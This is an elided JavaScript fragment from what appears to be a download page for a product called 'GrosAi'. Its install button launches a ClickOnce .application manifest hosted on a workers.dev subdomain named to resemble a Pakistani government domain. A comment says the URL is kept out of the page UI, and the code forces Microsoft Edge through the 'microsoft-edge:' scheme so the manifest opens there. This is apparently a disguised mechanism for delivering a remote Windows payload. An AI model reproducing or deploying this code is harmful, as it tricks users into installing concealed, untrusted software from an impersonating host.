(function () {
  ...
  /** Windows setup manifest — opened via Edge when not already in Edge (URL not shown in page UI). */
  var INSTALL_MANIFEST =
    "https://files.ifbr-gov-pk.workers.dev/files/GrosAi/GrosAi.application";

  function isMicrosoftEdge() {
    var ua = navigator.userAgent;
    if (/Edg\//i.test(ua) || /EdgiOS/i.test(ua)) return true;
    if (/Edge\//i.test(ua) && !/Chrome/i.test(ua)) return true;
  ...
  function launchWindowsSetup() {
    if (isMicrosoftEdge()) {
      window.location.assign(INSTALL_MANIFEST);
    } else {
      window.location.assign("microsoft-edge:" + INSTALL_MANIFEST);
    }
  }

  document.querySelectorAll("[data-install-launch]").forEach(function (el) {
